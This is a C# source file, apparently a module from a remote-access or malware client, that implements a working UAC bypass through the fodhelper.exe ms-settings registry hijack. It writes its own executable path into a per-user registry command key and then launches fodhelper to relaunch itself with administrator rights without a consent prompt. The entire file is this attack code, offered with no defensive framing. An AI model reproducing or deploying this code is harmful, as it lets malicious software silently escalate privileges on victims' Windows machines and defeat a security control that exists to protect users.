using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;

namespace Client.Configuration
{
    public class UACBypass
    {
        internal static void BypassUAC()
        {
            try
            {
                if (fucked())
                {
                    return;
                }

                string exePath = Process.GetCurrentProcess().MainModule.FileName;

                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command"))
                {
                    if (key != null)
                    {
                        key.SetValue("", exePath);
                        key.SetValue("DelegateExecute", "");
                    }
                    else
                    {
                        throw new Exception("Regedit key error");
                    }
                }

                Process.Start(new ProcessStartInfo
                {
                    FileName = "fodhelper.exe",
                    UseShellExecute = true,
                    Verb = "runas"
                });

                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        private static bool fucked()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
    }
}